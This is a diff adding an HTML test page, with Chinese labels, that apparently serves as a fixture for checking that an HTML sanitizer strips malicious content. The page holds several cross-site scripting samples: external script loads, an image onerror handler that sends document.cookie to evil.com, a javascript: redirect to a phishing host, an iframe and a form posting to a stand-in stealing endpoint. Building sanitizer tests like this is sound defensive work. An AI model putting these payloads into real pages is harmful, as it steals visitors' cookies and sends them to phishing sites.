@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>含恶意脚本的测试页面</title>
+</head>
+<body>
+    <h1>正常标题</h1>
+    <p>这是一段正常的文本内容，用于测试HTML清洗功能。</p>
+
+    <!-- 以下为恶意内容，应该在清洗后被移除 -->
+    <script>alert('恶意脚本注入');</script>
+    <script src="https://malicious.example.com/steal.js"></script>
+
+    <div onclick="stealCookies()" ondblclick="alert('double')">点击触发事件</div>
+
+    <img src="normal.jpg" onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
+
+    <a href="javascript:void(document.location='https://phishing.example.com')">危险链接</a>
+
+    <iframe src="https://malicious.example.com/ad"></iframe>
+
+    <form action="https://evil.com/steal" method="post">
+        <input type="hidden" name="data" value="stolen">
+    </form>
+
+    <p>正常文本继续，用于验证清洗后内容完整性。</p>
+</body>
+</html>
